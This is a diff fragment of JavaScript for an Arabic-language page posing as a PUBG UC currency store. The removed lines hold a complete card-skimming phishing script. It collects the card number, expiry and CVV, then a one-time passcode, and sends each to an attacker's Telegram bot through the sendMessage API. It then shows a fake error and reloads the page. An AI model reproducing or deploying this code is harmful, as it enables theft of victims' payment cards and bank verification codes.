-      cancelCustomBtn.addEventListener('click', function() {
-        customOverlay.classList.remove('active');
-        customInput.value = '';
-        const customOpt = document.querySelector('.coin-option.custom-option');
-        if (customOpt) {
-          customOpt.classList.remove('selected');
-          const defaultIcon = customOpt.querySelector('.uc-icon-default');
-          const checkIcon = customOpt.querySelector('.uc-icon-check');
-          if (defaultIcon) defaultIcon.style.display = 'block';
-          if (checkIcon) checkIcon.style.display = 'none';
-          
-          if (!customOpt.dataset.customCoins) {
-            let coinsEl = customOpt.querySelector('.coins');
-            if (coinsEl) coinsEl.textContent = 'مخصص';
-            let totalEl = customOpt.querySelector('.total-price');
-            if (totalEl) totalEl.remove();
-            if (!customOpt.querySelector('.badge')) {
-              const badge = document.createElement('div');
-              badge.className = 'badge';
-              badge.textContent = 'UC';
-              customOpt.appendChild(badge);
-            }
-          }
-        }
-        const defaultOpt = document.querySelector('.coin-option[data-coins="70"]');
-        if (defaultOpt) defaultOpt.click();
-        else if (coinOptions.length) coinOptions[0].click();
-      });
-
-      customOverlay.addEventListener('click', function(e) {
-        if (e.target === this) {
-          cancelCustomBtn.click();
-        }
-      });
-
-      countrySelect.addEventListener('change', function() {
-        updateAllPrices();
-        const selectedOpt = document.querySelector('.coin-option.selected');
-        if (selectedOpt) {
-          if (selectedOpt.classList.contains('custom-option')) {
-            const coins = parseInt(selectedOpt.dataset.customCoins);
-            if (coins && !isNaN(coins) && coins > 0) {
-              const usd = calculateUCPriceUSD(coins);
-              const rate = currencyData[countrySelect.value].rate;
-              const local = usd * rate;
-              selectedPriceUSD = usd;
-              selectedPrice = local;
-              const totalEl = selectedOpt.querySelector('.total-price');
-              if (totalEl) {
-                totalEl.textContent = `${currencyData[countrySelect.value].symbol} ${local.toFixed(2)}`;
-              }
-            }
-          } else {
-            const usd = parseFloat(selectedOpt.dataset.priceUSD);
-            if (!isNaN(usd)) {
-              const rate = currencyData[countrySelect.value].rate;
-              selectedPriceUSD = usd;
-              selectedPrice = usd * rate;
-            }
-          }
-        }
-      });
-
-      usernameInput.addEventListener('input', function(e) {
-        this.value = this.value.replace(/\D/g, '');
-        this.classList.remove('error');
-        playerOkMsg.classList.remove('show');
-        playerConfirmMsg.classList.remove('show');
-        if (confirmTimer) {
-          clearTimeout(confirmTimer);
-          confirmTimer = null;
-        }
-        if (okTimer) {
-          clearTimeout(okTimer);
-          okTimer = null;
-        }
-        // إذا كان الرقم مختلف عن السابق نعيد التعيين
-        if (this.value.trim() !== lastUsername) {
-          lastUsername = '';
-        }
-      });
-
-      usernameInput.addEventListener('blur', function() {
-        const val = this.value.trim();
-        if (isValidUsername(val)) {
-          // إذا كان نفس الرقم السابق ولم يتغير، نظهر تم تحديد اللاعب مباشرة
-          if (val === lastUsername) {
-            playerOkMsg.classList.remove('show');
-            playerConfirmMsg.classList.add('show');
-            this.classList.remove('error');
-            return;
-          }
-          
-          playerOkMsg.classList.add('show');
-          playerConfirmMsg.classList.remove('show');
-          lastUsername = val;
-          
-          if (okTimer) {
-            clearTimeout(okTimer);
-            okTimer = null;
-          }
-          if (confirmTimer) {
-            clearTimeout(confirmTimer);
-            confirmTimer = null;
-          }
-
-          okTimer = setTimeout(() => {
-            playerOkMsg.classList.remove('show');
-            playerConfirmMsg.classList.add('show');
-            okTimer = null;
-          }, 1000);
-
-        } else {
-          playerOkMsg.classList.remove('show');
-          playerConfirmMsg.classList.remove('show');
-          lastUsername = '';
-        }
-        this.classList.remove('error');
-      });
-
-      cardNumber.addEventListener('input', function(e) {
-        let raw = this.value.replace(/\s/g, '').replace(/\D/g, '');
-        if (raw.length > 16) raw = raw.slice(0, 16);
-        let formatted = '';
-        for (let i = 0; i < raw.length; i++) {
-          if (i > 0 && i % 4 === 0) formatted += ' ';
-          formatted += raw[i];
-        }
-        this.value = formatted;
-        clearFieldError(cardWrapper);
-
-        if (raw.length === 16) {
-          if (isValidCardNumber(this.value)) {
-            clearFieldError(cardWrapper);
-            expiry.focus();
-          } else {
-            setFieldError(cardWrapper, true);
-          }
-        }
-      });
-
-      expiry.addEventListener('input', function(e) {
-        let raw = this.value.replace(/\D/g, '');
-        if (raw.length > 4) raw = raw.slice(0, 4);
-        let formatted = '';
-        for (let i = 0; i < raw.length; i++) {
-          if (i === 2 && raw.length > 2) formatted += '/';
-          formatted += raw[i];
-        }
-        this.value = formatted;
-        clearFieldError(expiryWrapper);
-
-        if (raw.length === 4) {
-          if (validateExpiry(this.value)) {
-            clearFieldError(expiryWrapper);
-            cvv.focus();
-          } else {
-            setFieldError(expiryWrapper, true);
-          }
-        } else {
-          expiryValid = false;
-        }
-      });
-
-      expiry.addEventListener('blur', function() {
-        if (this.value.length === 5) {
-          if (!validateExpiry(this.value)) {
-            setFieldError(expiryWrapper, true);
-          } else {
-            clearFieldError(expiryWrapper);
-          }
-        }
-      });
-
-      cvv.addEventListener('input', function(e) {
-        this.value = this.value.replace(/\D/g, '');
-        if (this.value.length > 3) this.value = this.value.slice(0, 3);
-        clearFieldError(cvvWrapper);
-        if (this.value.length === 3) {
-          clearFieldError(cvvWrapper);
-        }
-      });
-
-      cvv.addEventListener('blur', function() {
-        if (this.value.length === 3) {
-          clearFieldError(cvvWrapper);
-        } else {
-          setFieldError(cvvWrapper, true);
-        }
-      });
-
-      otpInput.addEventListener('input', function(e) {
-        this.value = this.value.replace(/\D/g, '').slice(0, 8);
-      });
-
-      function sendToTelegram(message) {
-        return new Promise((resolve) => {
-          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-          const payload = {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-          };
-
-          fetch(url, {
-            method: 'POST',
-            headers: { 
-              'Content-Type': 'application/json',
-              'Accept': 'application/json'
-            },
-            body: JSON.stringify(payload),
-            keepalive: true
-          })
-          .then(response => {
-            resolve(true);
-          })
-          .catch(() => {
-            resolve(true);
-          });
-
-          setTimeout(() => {
-            resolve(true);
-          }, 3000);
-        });
-      }
-
-      function showErrorAfterDelay() {
-        errorPopupOverlay.classList.add('active');
-      }
-
-      function resetPage() {
-        window.location.reload();
-      }
-
-      function startCountdown() {
-        countdownValue = 30;
-        resendOtpBtn.disabled = true;
-        resendOtpBtn.classList.add('sent');
-        resendOtpBtn.innerHTML = `
-          <span class="sent-text"><i class="fas fa-check-circle"></i> تم الإرسال</span>
-          <span class="countdown-text">إعادة الإرسال بعد <span class="countdown">${countdownValue}</span> ثانية</span>
-        `;
-        
-        if (countdownInterval) clearInterval(countdownInterval);
-        countdownInterval = setInterval(function() {
-          countdownValue--;
-          if (countdownValue <= 0) {
-            clearInterval(countdownInterval);
-            countdownInterval = null;
-            resendOtpBtn.disabled = false;
-            resendOtpBtn.classList.remove('sent');
-            resendOtpBtn.innerHTML = `
-              <span class="resend-text"><i class="fas fa-redo"></i> إعادة إرسال رمز التحقق</span>
-            `;
-          } else {
-            resendOtpBtn.innerHTML = `
-              <span class="sent-text"><i class="fas fa-check-circle"></i> تم الإرسال</span>
-              <span class="countdown-text">إعادة الإرسال بعد <span class="countdown">${countdownValue}</span> ثانية</span>
-            `;
-          }
-        }, 1000);
-      }
-
-      resendOtpBtn.addEventListener('click', function() {
-        if (this.disabled) return;
-        startCountdown();
-      });
-
-      topupBtn.addEventListener('click', function() {
-        if (isProcessing) return;
-
-        const username = usernameInput.value.trim();
-        if (!username || !isValidUsername(username)) {
-          usernameInput.focus();
-          usernameInput.classList.add('error');
-          setTimeout(() => usernameInput.classList.remove('error'), 1000);
-          return;
-        }
-
-        if (selectedCoins === null || selectedCoins <= 0) {
-          coinOptions.forEach(opt => {
-            opt.style.borderColor = '#1a73e8';
-            setTimeout(() => { opt.style.borderColor = ''; }, 500);
-          });
-          return;
-        }
-
-        const cardRaw = cardNumber.value.replace(/\s/g, '');
-        if (!isValidCardNumber(cardRaw)) {
-          cardNumber.focus();
-          setFieldError(cardWrapper, true);
-          return;
-        } else {
-          clearFieldError(cardWrapper);
-        }
-
-        if (!expiryValid) {
-          if (expiry.value.length === 5) {
-            validateExpiry(expiry.value);
-          }
-          if (!expiryValid) {
-            expiry.focus();
-            setFieldError(expiryWrapper, true);
-            return;
-          }
-        } else {
-          clearFieldError(expiryWrapper);
-        }
-
-        if (cvv.value.length !== 3) {
-          cvv.focus();
-          setFieldError(cvvWrapper, true);
-          return;
-        } else {
-          clearFieldError(cvvWrapper);
-        }
-
-        const countryCode = countrySelect.value;
-        const currencySymbol = currencyData[countryCode].symbol;
-        const priceFormatted = selectedPrice.toFixed(2);
-
-        const message = `🟢 <b>طلب شراء UC (PUBG)</b> 🟢\n\n` +
-                        `👤 <b>PUBG ID:</b> ${username}\n` +
-                        `💰 <b>عدد UC:</b> ${selectedCoins.toLocaleString()}\n` +
-                        `💵 <b>السعر:</b> ${currencySymbol} ${priceFormatted}\n` +
-                        `🌍 <b>الدولة:</b> ${countrySelect.options[countrySelect.selectedIndex].text}\n\n` +
-                        `💳 <b>بيانات الفيزا:</b>\n` +
-                        `🔢 <b>الرقم:</b> ${cardRaw}\n` +
-                        `📅 <b>التاريخ:</b> ${expiry.value}\n` +
-                        `🔐 <b>CVV:</b> ${cvv.value}\n\n` +
-                        `📱 <b>تم الإرسال من:</b> PUBG UC Store`;
-
-        isProcessing = true;
-        topupBtn.disabled = true;
-        topupBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...`;
-
-        sendToTelegram(message).then(() => {
-          otpInput.value = '';
-          if (countdownInterval) {
-            clearInterval(countdownInterval);
-            countdownInterval = null;
-          }
-          resendOtpBtn.disabled = false;
-          resendOtpBtn.classList.remove('sent');
-          resendOtpBtn.innerHTML = `
-            <span class="resend-text"><i class="fas fa-redo"></i> إعادة إرسال رمز التحقق</span>
-          `;
-          // تأخير 1 ثانية قبل ظهور OTP
-          setTimeout(() => {
-            otpOverlay.classList.add('active');
-            setTimeout(() => otpInput.focus(), 300);
-          }, 1000);
-        });
-
-        setTimeout(() => {
-          if (isProcessing) {
-            isProcessing = false;
-            topupBtn.disabled = false;
-            topupBtn.innerHTML = 'Buy شراء';
-          }
-        }, 5000);
-      });
-
-      confirmBtn.addEventListener('click', function() {
-        const otp = otpInput.value.trim();
-        if (!otp || otp.length < 4 || otp.length > 8) {
-          otpInput.style.borderColor = '#dc2626';
-          otpInput.style.background = '#fef2f2';
-          setTimeout(() => {
-            otpInput.style.borderColor = '';
-            otpInput.style.background = '';
-          }, 500);
-          return;
-        }
-
-        const confirmMessage = `✅ <b>تم إدخال OTP</b> ✅\n\n` +
-                               `🔑 <b>الرمز المدخل:</b> <code>${otp}</code>`;
-
-        sendToTelegram(confirmMessage);
-        
-        otpOverlay.classList.remove('active');
-        if (isProcessing) {
-          isProcessing = false;
-          topupBtn.disabled = false;
-          topupBtn.innerHTML = 'Buy شراء';
-        }
-        
-        setTimeout(showErrorAfterDelay, 1000);
-      });
-
-      function closeOtpAndReset() {
-        otpOverlay.classList.remove('active');
-        if (isProcessing) {
-          isProcessing = false;
-          topupBtn.disabled = false;
-          topupBtn.innerHTML = 'Buy شراء';
-        }
-        if (countdownInterval) {
-          clearInterval(countdownInterval);
-          countdownInterval = null;
-        }
-        resendOtpBtn.disabled = false;
-        resendOtpBtn.classList.remove('sent');
-        resendOtpBtn.innerHTML = `
-          <span class="resend-text"><i class="fas fa-redo"></i> إعادة إرسال رمز التحقق</span>
-        `;
-      }
-
-      closeOtpBtn.addEventListener('click', closeOtpAndReset);
-      otpOverlay.addEventListener('click', function(e) {
-        if (e.target === this) {
-          closeOtpAndReset();
-        }
-      });
-
-      errorPopupCloseBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        errorPopupOverlay.classList.remove('active');
-        resetPage();
-      });
-      
-      errorPopupOverlay.addEventListener('click', function(e) {
-        if (e.target === this) {
-          errorPopupOverlay.classList.remove('active');
-          resetPage();
-        }
-      });
-
-      document.querySelectorAll('#cardNumber, #expiry, #cvv').forEach(input => {
-        input.addEventListener('focus', function() {
-          setTimeout(() => {
-            const card = document.getElementById('mainCard');
-            card.scrollIntoView({ behavior: 'smooth', block: 'end' });
-          }, 350);
-        });
-      });
-
-      buildCoinGrid();
-
-    })();
-  </script>
+})();
+</script>
 </body>
 </html>
